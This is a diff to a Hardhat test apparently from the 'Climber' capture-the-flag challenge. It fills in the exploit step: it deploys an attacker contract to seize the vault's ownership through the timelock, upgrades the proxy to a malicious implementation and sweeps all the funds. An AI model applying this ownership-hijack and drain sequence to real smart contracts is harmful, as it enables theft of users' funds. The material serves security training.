@@ -52,7 +52,23 @@ describe('[Challenge] Climber', function () {
     });
 
     it('Exploit', async function () {        
-        /** CODE YOUR EXPLOIT HERE */
+
+        const attackerContract = await (
+            await ethers.getContractFactory('AttackerClimberVault', attacker)
+        ).deploy(this.vault.address, this.timelock.address);
+
+        // This transfers ownership of the vault to the attacker
+        await attackerContract.connect(attacker).execute(attacker.address);
+
+        // Upgrade the vault to a malicious implementation
+        const AttackerClimberVaultFactory = await ethers.getContractFactory('AttackerClimberVaultUpgrade', attacker);
+        const maliciousVault = await upgrades.upgradeProxy(
+            this.vault.address,
+            AttackerClimberVaultFactory,
+        );
+
+        // Sweep all funds
+        await maliciousVault.connect(attacker).sweepFunds(this.token.address);
     });
 
     after(async function () {
